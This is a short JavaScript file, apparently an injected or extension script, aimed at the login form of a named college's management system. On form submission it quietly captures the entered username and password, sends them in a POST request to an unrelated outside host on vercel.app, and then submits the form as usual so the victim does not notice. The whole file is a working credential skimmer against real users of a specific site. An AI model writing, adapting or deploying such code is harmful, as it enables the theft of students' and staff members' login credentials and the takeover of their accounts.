document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector('form[action="https://mis.apexcollege.edu.np/login/validate"]');

  if (!form) return; 

  form.addEventListener("submit", (e) => {
    e.preventDefault(); 

    const usernameInput = form.querySelector('input[name="username"]');
    const passwordInput = form.querySelector('input[name="password"]');

    if (!usernameInput || !passwordInput) {
      
      form.submit();
      return;
    }

    const username = usernameInput.value.trim();
    const password = passwordInput.value;


    fetch("https://brother-alpha.vercel.app/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password })
    }).finally(() => {

      form.submit();
    });
  });
});
